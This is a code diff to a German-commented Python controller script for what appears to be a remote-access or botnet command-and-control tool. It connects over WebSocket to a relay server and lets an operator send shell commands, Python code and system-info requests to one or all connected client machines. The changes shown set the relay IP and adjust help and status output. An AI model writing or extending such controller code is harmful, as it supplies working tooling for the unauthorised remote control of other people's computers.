@@ -6,7 +6,7 @@ from colorama import init, Fore, Style
 
 init(autoreset=True)
 
-VPS_URL = "ws://DEINE_VPS_IP_HIER:8765"   # ←←← HIER ÄNDERN!
+VPS_URL = "ws://192.168.1.188:8765"   # ←←← HIER ÄNDERN!
 
 async def controller():
     while True:
@@ -26,11 +26,12 @@ async def controller():
                         )
                         if not cmd.strip():
                             continue
+
                         parts = cmd.strip().split(maxsplit=2)
                         action = parts[0].lower()
 
                         if action == "help":
-                            print("list | ping <id|all> | system_info <id|all> | shell <id|all> befehl | python <id|all> code")
+                            print("list | ping <id|all> | system_info <id|all> | shell <id|all> <befehl> | python <id|all> <code>")
                             continue
 
                         msg = {
@@ -41,7 +42,9 @@ async def controller():
                             "task_id": str(int(time.time() * 1000))[-8:]
                         }
                         await ws.send(json.dumps(msg))
-                        print(f"{Fore.CYAN}→ Befehl gesendet: {action}{Style.RESET_ALL}")
+
+                        if action != "list":
+                            print(f"{Fore.CYAN}→ Befehl gesendet: {action}{Style.RESET_ALL}")
 
                 # Zwei Tasks parallel laufen lassen
                 await asyncio.gather(console_input(), receive_results(ws))
